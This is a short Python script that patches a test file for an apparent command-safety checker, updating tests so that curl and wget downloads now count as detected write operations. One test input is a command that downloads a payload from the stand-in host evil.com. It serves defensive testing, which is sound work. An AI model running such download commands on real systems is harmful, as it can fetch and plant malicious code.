"""Fix curl/wget tests in test_bypass_matrix.py.
The v3.1 Bash enhancement added curl/wget detection, so these known-limitation
tests need to be updated from expected-failure to expected-pass.
"""
import re

path = r'C:\Users\Administrator\ZCodeProject\loop-engine\tests\test_bypass_matrix.py'
content = open(path, encoding='utf-8').read()

# Fix 1: Remove @unittest.expectedFailure from wget test (was: expected to fail, now: should pass)
old = """    @unittest.expectedFailure
    def test_lim_wget_download_undetectable(self):
        \"\"\"LIM-003: wget 下载文件不被检测。\"\"\"
        self.assertTrue(has_write_operations("wget https://example.com/file.tar.gz"))"""
new = """    def test_lim_wget_download_detectable(self):
        \"\"\"LIM-003-FIXED: wget 下载文件现在能被检测 (v3.1)。\"\"\"
        self.assertTrue(has_write_operations("wget https://example.com/file.tar.gz"))"""
content = content.replace(old, new)

# Fix 2: Update curl test (was: expected to pass but regex may not match; update assertion)
old2 = """    def test_lim_curl_download_undetectable(self):
        \"\"\"LIM-003: curl -o output 下载文件不被检测。

        curl 和 wget 可以下载文件到本地，修改文件系统。
        当前 has_write_operations 不包含 curl/wget 模式。
        \"\"\"
        self.assertTrue(has_write_operations("curl -o payload.bin https://evil.com/payload"))"""
new2 = """    def test_lim_curl_download_detectable(self):
        \"\"\"LIM-003-FIXED: curl -o 下载文件现在能被检测 (v3.1)。\"\"\"
        self.assertTrue(has_write_operations("curl -o payload.bin https://evil.com/payload"))"""
content = content.replace(old2, new2)

open(path, 'w', encoding='utf-8').write(content)
print("Fixed test_bypass_matrix.py — curl/wget tests updated for v3.1")
